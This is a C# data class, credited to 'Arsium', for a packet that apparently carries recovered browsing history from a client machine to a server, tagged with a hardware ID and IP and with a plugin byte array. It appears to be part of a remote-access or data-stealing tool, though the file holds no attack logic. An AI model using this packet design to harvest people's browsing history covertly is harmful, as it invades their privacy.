using System;
using System.Collections.Generic;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class HistoryPacket : IPacket
    {
        //server
        public HistoryPacket() : base()
        {
            PacketType = PacketType.RECOVERY_HISTORY;
        }

        //client
        public HistoryPacket(List<object[]> history, string baseIp, string HWID) : base()
        {

            PacketType = PacketType.RECOVERY_HISTORY;
            this.BaseIp = baseIp;
            this.HWID = HWID; 
            
            this.historyList = history;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public List<object[]> historyList { get; set; }
    }
}

